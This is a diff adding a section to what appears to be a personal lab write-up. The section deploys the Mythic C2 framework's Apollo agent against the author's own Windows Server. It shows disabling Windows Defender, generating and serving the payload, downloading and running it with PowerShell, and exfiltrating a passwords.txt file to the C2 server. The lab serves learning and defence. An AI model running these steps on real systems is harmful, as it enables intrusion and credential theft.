@@ -620,15 +620,64 @@ net user Administrator
 
 This command allowed me to see which groups the Administrator account was a member of. I also went into the **Settings** and disabled **Windows Defender**. Finally, I established an SSH connection into the **Mythic Server**.
 
+I went to the **Mythic** website to explore agents compatible with **Windows** and decided to use the **Apollo** agent. In the terminal, I typed the following command to install it:
 
+```bash
+./mythic-cli install github https://github.com/MythicAgents/Apollo.git
+```
 
+After a few minutes, the **Apollo** agent appeared under my Mythic agents:
+![Apollo Agent Installed](https://github.com/user-attachments/assets/2d1579be-923c-4ed0-9b36-c7f0b2346c8d)
 
+Next, I installed the **http** profile by running:
 
+```bash
+./mythic-cli install github https://github.com/MythicC2Profiles/http
+```
 
+Once installed, I created a new payload for **Windows** in Mythic, choosing the `WindowsExe` package and including all the necessary commands. I selected the **http C2 Profile** and, for the **Callback Host**, I entered `http://[mythic server's public IP]`. After completing the setup, I generated the payload.
 
+I copied the download link and ran the following command in my terminal to download the file:
 
+```bash
+wget https://149.28.88.178:7443/direct/download/b8f70270-2709-4ee0-819b-2420cba3e725 --no-check-certificate
+```
 
+Once downloaded, I renamed the file to `apollo.exe`, created a directory named `1`, and moved the file into that directory.
 
+To serve the file, I used Python's built-in HTTP module with the following code:
+
+```bash
+python3 -m http.server 9999
+```
+
+On my **Windows Server**, I opened **PowerShell** and used the following command to download the **Apollo** agent:
+
+```bash
+Invoke-WebRequest -Uri http://[mythic server's IP]:9999/apollo.exe -OutFile "C:\Users\Public\Downloads\apollo.exe"
+```
+![File Downloaded](https://github.com/user-attachments/assets/99fd65cb-de26-4683-bc74-134078c54027)
+
+I then executed the **Apollo** agent with:
+
+```bash
+.\apollo.exe
+```
+
+Immediately, the callback appeared in my **Mythic Agent Dashboard**:
+![Callback Success](https://github.com/user-attachments/assets/e1018584-d0cd-4907-be4c-f0e18647136e)
+
+To test the connection, I ran some commands (e.g., `whoami`, `ifconfig`) directly from the **Mythic Agent** interface, and the results were returned successfully:
+![Command Results](https://github.com/user-attachments/assets/7fe560e0-b6c7-445f-ac45-414180f956ad)
+
+Finally, I attempted to download the `passwords.txt` file from earlier using this command:
+
+```bash
+download C:\Users\Administrator\Documents\passwords.txt
+```
+
+Once the command completed, I navigated to the **Files** section in Mythic and successfully viewed the contents of `passwords.txt`:
+![Passwords File Contents](https://github.com/user-attachments/assets/dc22e6c2-6d73-49ce-a5f2-173523d32dbe)
 
 
 
